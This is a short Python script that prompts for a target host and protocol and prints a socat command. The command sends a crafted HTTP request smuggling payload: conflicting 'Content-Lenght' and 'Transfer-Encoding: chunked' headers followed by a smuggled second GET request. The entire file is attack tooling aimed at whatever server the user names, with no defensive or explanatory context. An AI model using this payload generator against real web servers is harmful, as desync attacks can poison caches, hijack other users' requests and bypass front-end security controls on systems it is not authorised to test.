host = input("Enter the host: ")
SSL = input("TCP (or) SSL: ")
if SSL == "TCP":
    port = "80"
else:
    port = "443"

print(f"""cat <(printf "POST /hello HTTP/1.1\\r\\nHost: {host}\\r\\nContent-Lenght: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /postshit HTTP/1.1\\r\\nHost: {host}") - | socat - {SSL}:{host}:{port}""")
